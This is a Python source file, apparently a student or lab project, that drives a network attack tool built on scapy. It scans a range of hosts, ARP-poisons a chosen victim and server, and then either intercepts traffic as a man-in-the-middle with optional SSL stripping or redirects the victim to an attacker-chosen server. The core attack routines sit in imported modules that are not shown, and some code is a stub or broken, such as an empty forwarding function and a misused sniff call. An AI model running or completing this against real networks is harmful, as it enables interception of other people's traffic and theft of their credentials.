import ARPpoisoning as ArpPoisen;
import sslStripping as sslStripping;
import scapy.all as sc;
import re
import ipaddress

victimIP = ""
serverIP = ""
victimMac = ""
serverMac = ""
attackerIP = sc.conf.route.route("0.0.0.0")[1]
attackerMac = sc.get_if_hwaddr(sc.conf.iface)


def main():
    sc.show_interfaces()
    while True:
        ipt = ""
        ip_range = ""
        targets = ""
        goal = ""
        sslStrip = ""
        ownServerIp = ""
        silent = ""
        while (ipt != "scan" and  ipt != "arp" and ipt != "quit"):
            if (ipt != ""):
                print("Invalid input, please try again")
            ipt = input("Enter a command: Scan, ARP, quit: ").strip().lower()

        if ipt == "scan":
            while (not is_cidr_range(ip_range)):
                if (ip_range != ""):
                    print("Invalid input, please try again")
                ip_range = input("Enter ip range in CIDR notation: ").strip().lower()
            scan(ip_range)

        elif ipt == "arp":
            while (not is_valid_ip_pair(targets)):
                if (targets != ""):
                    print("Invalid input, please try again")
                targets = input("Enter 'victim ip, server ip'. Server ip can be 'none' or both can be 'none: ").strip().lower()
            parts = [p.strip() for p in targets.split(',')]

            while (silent != "silent" and silent != "allout"):
                if (silent != ""):
                    print("Invalid input, please try again")
                silent = input("Enter 'silent' or 'allOut': ").strip().lower()

            while (goal != "mitm" and goal != "ownserver"):
                if (goal != ""):
                    print("Invalid input, please try again") 
                goal = input("Enter a goal: 'mitm' or 'ownserver': ").strip().lower()
            ownServerMac = ""


            if goal == "ownserver":
                while (not is_ipv4_address(ownServerIp)):
                    if (ownServerIp != ""):
                        print("Invalid input, please try again")                    
                    ownServerIp = input("Enter a ip adress to reroute victim to: ").strip().lower()
                ownServerMac = get_mac(ownServerIp)
                print(ownServerIp)
                print(ownServerMac)
                    
            elif goal == "mitm":
                while (sslStrip != "yes" and sslStrip != "no" and sslStrip != "y" and sslStrip != "n"):
                    if (sslStrip != ""):
                        print("Invalid input, please try again")                    
                    sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
            
            if len(parts) == 2:
                victimIP = parts[0] if parts[0] != "none" else None
                serverIP = parts[1] if parts[1] != "none" else None
                print("len part", victimIP, " server: ",serverIP)

                ArpPoisen.arp_poison(victimIP, serverIP, silent)

                if goal == "ownserver":
                    forwardToExternalServer()
                    return
                    
                elif goal == "mitm":
                    pkt = sc.sniff(filter="tcp", store=0)
                    if pkt.haslayer(sc.TCP):
                        tcp = pkt[sc.TCP]
                        if tcp.flags == "S":
                            if (not ArpPoisen.three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP)):
                                continue
                            if (sslStrip == "yes"):
                                sslStripping.stripping(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
                            else:
                                sslStripping.forward(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
            else:
                print("Invalid input format. Please enter in the form: 'victim ip, server ip'")
        elif ipt == "quit":
            break
        else:
            print("Unknown command. Try again.")


def get_mac(ip):
    # Create ARP request packet
    arp_request = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Send the packet and receive the response
    answered_list = sc.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    # Parse response
    for sent, received in answered_list:
        return received.hwsrc  # MAC address

    return None

def scan(ip_range):
    hosts = ArpPoisen.network_scan(ip_range)
    for host in hosts:
        print(host)
    return



def is_valid_ip_pair(s):
    ip_octet = r"(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)"
    ip_pattern = rf"{ip_octet}\.{ip_octet}\.{ip_octet}\.{ip_octet}"

    full_ip = rf"^{ip_pattern},\s*{ip_pattern}$"
    ip_none = rf"^{ip_pattern},\s*none$"
    none_none = r"^none,\s*none$"

    return bool(
        re.match(full_ip, s, re.IGNORECASE) or
        re.match(ip_none, s, re.IGNORECASE) or
        re.match(none_none, s, re.IGNORECASE)
    )

def is_cidr_range(s):
    try:
        # Check if it's a valid IPv4 network
        ipaddress.IPv4Network(s, strict=False)
        return True
    except ValueError:
        return False
    
def is_ipv4_address(s):
    try:
        ipaddress.IPv4Address(s)
        return True
    except ValueError:
        return False
    
def forwardToExternalServer():
    return

if __name__ == "__main__":
    main()